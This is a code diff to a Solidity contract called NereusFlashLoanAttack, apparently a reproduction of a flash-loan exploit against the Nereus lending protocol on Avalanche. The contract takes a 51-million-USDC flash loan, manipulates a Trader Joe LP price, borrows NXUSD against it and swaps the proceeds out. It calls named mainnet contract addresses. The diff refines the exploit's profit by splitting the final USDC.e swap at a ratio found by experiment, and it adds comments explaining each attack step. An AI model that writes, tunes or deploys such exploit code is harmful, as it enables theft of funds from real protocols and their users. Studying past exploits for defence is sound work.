@@ -4,21 +4,8 @@ pragma solidity ^0.8.0;
 
 import '@openzeppelin/contracts/token/ERC20/IERC20.sol';
 
-interface IJoePair is IERC20 {
-  function mint(address to) external returns (uint256);
-
-  function swap(
-    uint256 amount0Out,
-    uint256 amount1Out,
-    address to,
-    bytes calldata data
-  ) external;
-}
-
 interface ICauldronV2 {
   function updateExchangeRate() external returns (bool updated, uint256 rate);
-
-  function exchangeRate() external view returns (uint256);
 
   function borrow(address to, uint256 amount) external returns (uint256 part, uint256 share);
 
@@ -83,12 +70,6 @@ interface IDegenBox {
   ) external returns (uint256 amountOut, uint256 shareOut);
 
   function balanceOf(address token, address account) external view returns (uint256);
-
-  function toShare(
-    IERC20 token,
-    uint256 amount,
-    bool roundUp
-  ) external view returns (uint256 share);
 }
 
 interface IFlashLoaner {
@@ -101,24 +82,6 @@ interface IFlashLoaner {
   ) external;
 }
 
-interface ICurvePool {
-  function balanceOf(address addr) external view returns (uint256);
-
-  function exchange_underlying(
-    int128 i,
-    int128 j,
-    uint256 dx,
-    uint256 min_dy
-  ) external returns (uint256);
-
-  function exchange(
-    int128 i,
-    int128 j,
-    uint256 dx,
-    uint256 min_dy
-  ) external returns (uint256);
-}
-
 interface ICurveMeta {
   function exchange_underlying(
     address pool,
@@ -129,8 +92,13 @@ interface ICurveMeta {
   ) external returns (uint256);
 }
 
-interface IAToken is IERC20 {
-  function transferUnderlyingTo(address target, uint256 amount) external returns (uint256);
+interface ICurveStablePool {
+  function exchange(
+    int128 i,
+    int128 j,
+    uint256 dx,
+    uint256 min_dy
+  ) external returns (uint256);
 }
 
 contract NereusFlashLoanAttack {
@@ -138,13 +106,14 @@ contract NereusFlashLoanAttack {
   IERC20 nxusd = IERC20(0xF14f4CE569cB3679E99d5059909E23B07bd2F387);
   IERC20 wavax = IERC20(0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7);
   IERC20 usdce = IERC20(0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664);
-  IJoePair wavaxusdc = IJoePair(0xf4003F4efBE8691B60249E6afbD307aBE7758adb);
+  IERC20 wavaxusdc = IERC20(0xf4003F4efBE8691B60249E6afbD307aBE7758adb);
   IDegenBox degenbox = IDegenBox(0x0B1F9C2211F77Ec3Fa2719671c5646cf6e59B775);
   ICauldronV2 cauldron = ICauldronV2(0xC0A7a7F141b6A5Bce3EC1B81823c8AFA456B6930);
   address masterCauldron = 0xE767C6C3Bf42f550A5A258A379713322B6c4c060;
   ITraderJoeRouter router = ITraderJoeRouter(0x60aE616a2155Ee3d9A68541Ba4544862310933d4);
   IFlashLoaner flashLoaner = IFlashLoaner(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
-  ICurvePool nxusd3crv = ICurvePool(0x6BF6fc7EaF84174bb7e1610Efd865f0eBD2AA96D);
+  address nxusd3crv = 0x6BF6fc7EaF84174bb7e1610Efd865f0eBD2AA96D;
+  ICurveStablePool usdceusdc = ICurveStablePool(0x3a43A5851A3e3E0e25A3c1089670269786be1577);
   ICurveMeta curvemeta = ICurveMeta(0x001E3BA199B4FF4B5B6e97aCD96daFC0E2e4156e);
 
   function exploit() public {
@@ -164,15 +133,19 @@ contract NereusFlashLoanAttack {
     // we attempt to exchange NXUSD
     nxusd.approve(address(curvemeta), type(uint256).max);
 
-    // Approve USDC.e for the router so we can exchange our final USDC.e for
-    // USDC
+    // Approve USDC.e for the USDC.e - USDC stable swap curve pool so we can
+    // exchange our USDC.e for USDC in the end
+    usdce.approve(address(usdceusdc), type(uint256).max);
     usdce.approve(address(router), type(uint256).max);
 
     // Allow the CauldronV2 master contract to make transactions (i.e decisions)
-    // for us
+    // for us. This is required when we attempt to borrow NXUSD, as we have
+    // to make calls to the CauldronV2 contract and allow it to make calls to
+    // the DegenBox contract for us.
     degenbox.setMasterContractApproval(address(this), masterCauldron, true, 0, 0, 0);
 
-    // Now, lets get the flash loan for 51 million USDC
+    // Now, lets get the flash loan for 51 million USDC. This calls
+    // `executeOperation()` below.
     flashLoaner.flashLoanSimple(address(this), address(usdc), 51000000e6, '', 0);
   }
 
@@ -183,11 +156,11 @@ contract NereusFlashLoanAttack {
     address,
     bytes calldata
   ) public returns (bool) {
+    // Step 1: Swap 280,000 USDC for as much WAVAX as possible
     address[] memory path = new address[](2);
     path[0] = address(usdc);
     path[1] = address(wavax);
 
-    // Step 1: Swap 280,000 USDC for as much WAVAX as possible
     router.swapExactTokensForTokens(280000e6, 1, path, address(this), block.timestamp * 5);
 
     // Step 2: Add 260,000 USDC and as much WAVAX (in this case, assume 20000
@@ -255,16 +228,25 @@ contract NereusFlashLoanAttack {
     // Note that index 2 is avUSDC, but the function wraps it to USDC.e before
     // returning it to us
     curvemeta.exchange_underlying(
-      address(nxusd3crv),
+      nxusd3crv,
       0, // Within the NXUSD3Crv pool, the 0 index in the `coins` mapping is NXUSD
       2, // The index of the output coin, which in this case is avUSDC
       nxusd.balanceOf(address(this)),
       1 // Minimum amount to get back
     );
 
-    // Now, swap all the USDC.e for USDC
+    // Now, swap 80.8% of our USDC.e for USDC using the Curve.fi USDC.e - USDC
+    // Stable Swap pool, and the rest through the Trader Joe Router.
+    //
+    // Swapping 100% of the USDC.e through the pool, or 100% of the USDC.e
+    // through the router yields a much lower result. I found 80.8% to be
+    // the best ratio experimentally
+    uint256 optimalStableSwapPoolSwapAmount = ((usdce.balanceOf(address(this)) * 808) / 1000);
+    usdceusdc.exchange(0, 1, optimalStableSwapPoolSwapAmount, 1);
+
     path[0] = address(usdce);
     path[1] = address(usdc);
+
     router.swapExactTokensForTokens(
       usdce.balanceOf(address(this)),
       1,
@@ -276,7 +258,9 @@ contract NereusFlashLoanAttack {
     return true;
   }
 
+  // Test function to use at each stage of the exploit to return any variable
+  // for viewing
   function test() public view returns (uint256) {
-    return usdc.balanceOf(address(this));
+    return usdce.balanceOf(address(this));
   }
 }
